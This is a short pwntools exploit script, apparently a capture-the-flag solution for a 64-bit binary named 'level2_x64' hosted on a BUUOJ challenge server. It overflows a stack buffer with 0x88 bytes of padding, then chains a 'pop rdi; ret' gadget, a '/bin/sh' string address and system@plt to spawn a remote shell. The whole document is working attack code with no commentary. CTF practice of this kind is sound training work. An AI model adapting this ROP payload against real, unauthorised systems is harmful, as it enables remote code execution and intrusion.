from pwn import *

io = remote('node4.buuoj.cn', 25839) 
# io = process('level2_x64')
elf = ELF('level2_x64')
bin_sh_addr = 0x600A90
system_addr = elf.plt['system']
pop_rdi_ret = 0x4006b3

payload = cyclic(0x88) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
io.sendline(payload)
io.interactive()

